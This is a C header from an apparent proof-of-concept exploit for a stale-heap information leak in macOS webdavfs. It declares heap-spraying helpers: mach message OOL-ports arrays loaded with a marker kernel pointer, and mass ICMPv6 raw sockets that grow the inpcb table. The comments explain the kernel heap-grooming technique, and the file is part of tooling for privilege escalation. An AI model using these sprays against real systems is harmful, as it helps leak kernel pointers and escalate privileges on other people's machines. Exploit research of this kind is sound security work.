/*
 * spray.h -- heap-grooming helpers for the webdavfs stale-heap info-leak PoC.
 *
 * Two sprays, both targeting kalloc_large page reclamation with interesting
 * residue (see Black Hat USA 2026, Blazakis/Calif):
 *
 *  (a) mach_msg OOL-ports spray: each message carries one OOL-ports
 *      descriptor with N port descriptors; the kernel copyin allocates an
 *      N*8-byte kalloc_large array of ipc_port pointers. With N = 16383 that
 *      is 131064 bytes per message. All descriptors reference a single
 *      "marker" port, so every freed array is filled with copies of one
 *      recognizable kernel pointer.
 *
 *  (b) ICMPv6 raw-socket spray: thousands of AF_INET6/SOCK_RAW/IPPROTO_ICMPV6
 *      sockets to grow the raw PCB inpcb pointer table.
 *
 * macOS only; everything is compiled out on other platforms.
 */

#ifndef LPE_SPRAY_H
#define LPE_SPRAY_H

#include <stdint.h>

#ifdef __APPLE__

#ifdef __cplusplus
extern "C" {
#endif

typedef struct port_spray port_spray_t;
typedef struct inpcb_spray inpcb_spray_t;

/*
 * Queue n_messages mach messages, each carrying one OOL-ports descriptor
 * with descs_per_msg descriptors (kernel-side kalloc_large(descs_per_msg*8)
 * array of identical ipc_port pointers). Returns NULL on failure.
 */
port_spray_t *ool_ports_spray_start(uint32_t n_messages,
                                    uint32_t descs_per_msg);

/* Destroy all queued messages and ports, freeing the kalloc_large arrays. */
void ool_ports_spray_destroy(port_spray_t *spray);

/* Open up to n_sockets ICMPv6 raw sockets (needs root). May return a spray
 * holding fewer sockets than requested if a limit or EPERM is hit. */
inpcb_spray_t *inpcb_spray_start(int n_sockets);

/* How many sockets were actually opened. */
int inpcb_spray_count(const inpcb_spray_t *spray);

/* Close all sockets and release the spray. */
void inpcb_spray_destroy(inpcb_spray_t *spray);

#ifdef __cplusplus
}
#endif

#endif /* __APPLE__ */

#endif /* LPE_SPRAY_H */
